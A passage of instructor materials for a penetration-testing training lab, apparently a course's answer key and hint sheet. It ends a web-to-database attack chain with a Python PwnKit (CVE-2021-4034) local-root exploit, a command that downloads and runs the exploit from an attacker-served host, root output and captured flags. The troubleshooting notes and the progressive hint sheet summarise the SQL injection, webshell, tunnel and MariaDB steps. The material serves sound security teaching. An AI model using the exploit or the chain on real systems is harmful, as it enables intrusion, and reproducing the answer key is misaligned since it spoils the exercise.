    try:
        os.chdir(tmpdir)
        os.mkdir("GCONV_PATH=.")
        with open("GCONV_PATH=./pwnkit", "w") as f:
            pass
        os.chmod("GCONV_PATH=./pwnkit", int("0755", 8))
        os.mkdir("pwnkit")
        with open("pwnkit/pwnkit.so", "wb") as f:
            f.write(base64.b64decode(SO_BASE64))
        with open("pwnkit/gconv-modules", "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")

        envp = [b"pwnkit", b"PATH=GCONV_PATH=.", b"CHARSET=PWNKIT", b"SHELL=pwnkit", None]
        c_envp = (ctypes.c_char_p * len(envp))()
        for i, e in enumerate(envp):
            c_envp[i] = ctypes.c_char_p(e) if e is not None else None

        c_argv = (ctypes.c_char_p * 1)()
        c_argv[0] = None  # empty argv[0] is the core PwnKit trigger condition

        libc = ctypes.CDLL(None)
        libc.execve(b"/usr/bin/pkexec", c_argv, c_envp)
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

if __name__ == "__main__":
    main()
```

**Observation:** The script fabricates a directory literally named `GCONV_PATH=.` and a `gconv-modules` file naming a `PWNKIT` charset, then calls `pkexec` with an environment that makes glibc's charset-conversion loader resolve into that attacker-controlled directory and `dlopen()` the payload `.so` — as root, because `pkexec` runs SUID-root.

#### Deliver and Run on the Target

From the attacker box, serve the script over HTTP (a redirector IP may be used instead of the attacker's own address depending on deployment):

```
python3 -m http.server 8000
```

From the target shell:

```
bash> cd /tmp
bash> wget http://<kali-or-redirector-IP>:8000/pwnkit.py
bash> python3 pwnkit.py
```

_Output:_

```
root@webtosql-db:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

**Observation:** The exploit returns an interactive root shell on the database server.

`/root` is the home directory for this session. List it, then read the root-tier flag:

```
root@webtosql-db:/tmp# ls /root
```

_Output excerpt (relevant line):_

```
flag.txt
```

**How students know this value:** After `id` shows `uid=0(root)`, enumerating `/root` is ordinary post-escalation collection. The same pattern already paid off as `mysql` in `/var/lib/mysql`.

```
root@webtosql-db:/tmp# cat /root/flag.txt
```

_Output:_

```
star-road
```

**Observation:** `star-road` is proof of root on the database host.

**Inference:** This confirms full compromise of both tiers: web-application RCE via SQL injection → credential harvest → tunneled database access → MariaDB `SUPER`-privilege code execution → local root via PwnKit.

### 10. Objective Confirmation

From the root shell, confirm persistence-worthy access and capture evidence for the engagement report:

```
root@webtosql-db:/tmp# hostname; id; cat /etc/os-release | head -2
```

_Output excerpt:_

```
webtosql-db
uid=0(root) gid=0(root) groups=0(root)
NAME="Ubuntu"
VERSION="20.04.x LTS"
```

Confirm all three flags are in the write-up (`toad-house` from the web includes folder, `bowser-castle` from the `mysql` datadir, `star-road` from `/root`).

Document the full chain for the write-up:

1. **Web tier:** UNION-based SQL injection in the login form (`login.php`) — full authentication bypass, no valid credentials required.
2. **Web tier RCE:** Godzilla webshell uploaded through the authenticated admin file-upload feature; code execution as `nt authority\local service`; web-tier flag `toad-house` in `C:\xampp\htdocs\includes\flag.txt`.
3. **Credential exposure:** `C:\xampp\htdocs\includes\db_config.php` contained both the application's low-privilege database account and a leftover developer root credential.
4. **Pivot:** chisel reverse SOCKS tunnel through the web server, routed with `proxychains`, to reach the internal-only database segment.
5. **Database tier RCE:** `SUPER`-privileged MariaDB account abused via `wsrep_provider` to `dlopen()` an attacker-supplied shared object, yielding a shell as the `mysql` service account; mysql-user flag `bowser-castle` in `/var/lib/mysql/flag.txt` (TOAD'S CHECKPOINT).
6. **Privilege escalation:** CVE-2021-4034 (PwnKit) used against the SUID `pkexec` binary to reach root on the database server; root flag `star-road` in `/root/flag.txt`.

At this point the database tier is fully compromised at the OS level, upstream of and independent from the application's own data. Web-to-SQL is complete.

## Troubleshooting / confirmation

- If a team stalls, release one phase from [`supporting-documents/L2.13 Web-to-SQL Instructor Hints.md`](https://moodle.cso.ops/mod/page/view.php?id=5691). Do not dump the full chain.
- If `200.200.200.1` does not respond, confirm live-action stack `b02-web-to-sql` is up.
- If `curl` of `/` shows no form, that is expected: `302` to `login.php` with an empty body. Follow `Location`. If `login.php` returns `200` but the terminal shows only headers, `cat` the `-o` file — `-D -` is stdout, `-o` is the body.
- If sqlmap asks about `PHPSESSID`, answer `Y`. `--batch` does not skip that prompt.
- If sqlmap ends right after DBMS confirm, that run only fingerprinted injection. Add `--current-db`, `--tables`, or `--dump`.
- If sqlmap "resumed" old injection points and you need a clean demo, add `--flush-session` on the **first** sqlmap command only.
- If `Password: col3` does not succeed, confirm the UNION username does **not** start with a known account (`admin`) — that returns the real admin row first. Retry `col1`–`col4`. If none succeed, use the sqlmap dump of `web_portal_users` and log in with `admin` / `Password1!`.
- If Godzilla `whoami` is `nt authority\local service` instead of SYSTEM, that is expected. Do not spend time escalating on the web host.
- If MariaDB or PwnKit steps fail, confirm the team is on the database host (not still on the web tier). Do not look for `gcc` on the SQL host. If they stall after the `mysql` shell and `bowser-castle` / TOAD'S CHECKPOINT, walk load and compile from the hint sheet (`docker load -i /opt/docker-gcc/pwnkit-gcc-12.04.tar.gz`, then compile with `pwnkit-gcc:12.04`). If `docker run` tries to pull or apt fails, the image was not loaded (`docker images` should show `pwnkit-gcc:12.04`). Do not hand PwnKit source or the Python driver.
- Chisel and reverse-shell callbacks use `200.200.200.2` (ops box), not `192.168.172.132`. Trust reachability of `200.200.200.1` from the live-action range.

## Grading checkpoints

This Module is ungraded. Use the checkpoints as debrief standards from the student brief.

| Checkpoint             | Acceptable evidence                                                                                                          |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Web-tier access        | Authentication bypass and webshell / RCE on the web host, with `toad-house` from `C:\xampp\htdocs\includes\flag.txt`         |
| Pivot                  | Tunnel or equivalent path into the internal database segment                                                                 |
| Database-tier as mysql | Shell as `mysql` on the database host, with `bowser-castle` from `/var/lib/mysql/flag.txt` (accepted before PwnKit)          |
| Highest privilege      | Interactive root (or equivalent) on the database host, with `id` / `hostname` evidence and `star-road` from `/root/flag.txt` |
| Chain write-up         | Tier-by-tier access chain another operator could follow                                                                      |

---
# L2.13 Web-to-SQL — Instructor Hint Sheet (Progressive Release Only)

**Use:** Guiding hints for teams that are stuck, released one phase at a time, only to teams that need them. **Do not distribute this document to students** and do not reveal a hint before a team has made a genuine attempt at the corresponding phase.

**Companion docs:**

- [`student-brief.md`](https://moodle.cso.ops/mod/assign/view.php?id=5689) — given to students at lab start.
- B02.M16 instructor materials in Lesson Plans and Instructor Slides.zip — facilitation SoT (opening, timing, progressive hint release).
    
- [`answer-key.md`](https://moodle.cso.ops/mod/page/view.php?id=5690) — full discovery-to-root walkthrough (exact commands, payloads, credentials, exploit code).
    

## How to Use This

- Withhold by default. The lab is designed to be solvable from the Student Brief's operational context and standard recon methodology alone.
    
- If a team stalls on a phase for an extended period (instructor's judgment — e.g., 15–20 minutes with no forward progress), share only the hint matching where they're stuck.
    
- Reveal hints **in order**; do not skip ahead even if a team asks about a later phase.
    
- These are directional hints, not exact syntax. If a team needs exact commands, point them back at their own evidence and tool documentation — do not hand them lines from the Instructor Guide. **Exception:** after the second flag, when they come to you because a needed compile tool is missing, you may give the `docker load` / `docker run` compile lines in phase 8. Do not dump the rest of the answer key.
    

## Phase Hints

1. **Recon the web tier.** Identify what services the target exposes and how its application authenticates users.
    
2. **Test the authentication mechanism.** Determine whether the login logic can be bypassed through injection-based testing. If you get a database error back, that error is telling you something — read it carefully before trying another payload.
    
3. **Expand access.** Once authenticated, look for additional attack surface inside the application that could lead to code execution on the host — check for anywhere the app lets you upload something.
    
4. **Enumerate the foothold — first flag.** With code execution, look for configuration data that might point to additional infrastructure or stored credentials. The web-tier flag should be reachable from here.
    
5. **Determine reachability.** Check whether anything you found is directly reachable from your attacker position. If not, use a pivot/tunnel technique to reach it through the host you already control.
    
6. **Access the new tier.** Use what you've discovered to authenticate to the newly reached system, and determine what level of access that account actually has.
    
7. **Escalate if needed.** If your access on that tier is not already privileged, look for another credential you may have already collected but not yet tried, before assuming you need an exploit.
    
8. **Service-account shell — second flag.** Once they have a host shell as the database service account, look for proof of access in that account's native directories. That file may also tell them to speak with the instructor if the next step needs something that is not on this host.
    
    **When they come to you after the second flag:** The SQL host has no `gcc`, and this range has no internet (`apt-get` and Docker Hub pulls will fail). A compile image is already on the ops/Kali box. Walk them through load and compile only; they still write their own source and finish the LPE themselves.
    
    ```
    ls /opt/docker-gcc
    docker load -i /opt/docker-gcc/pwnkit-gcc-12.04.tar.gz
    docker images
    ```
    
    `docker images` should show `pwnkit-gcc:12.04`. Then compile inside that image (old glibc, current directory bind-mounted):
    
    ```
    docker run --rm -v "$PWD":/tmp -w /tmp pwnkit-gcc:12.04 \
     gcc -shared -o pwnkit.so pwnkit.c -fPIC
    ```
    
    If `docker run` tries to pull, the image was not loaded. Stop here. Do not give PwnKit source, the Python driver, or how to deliver the exploit.
    
9. **Local privilege escalation — third flag.** If you have a shell but not root, enumerate the host broadly for a viable escalation path (don't jump straight to a specific exploit name). The root flag should only be reachable at the highest privilege level.
    
10. **Document the chain.** Record every transition — entry vector, credentials, pivot points, and final privilege level obtained on each tier — clearly enough that a teammate could follow your logic without you in the room.hg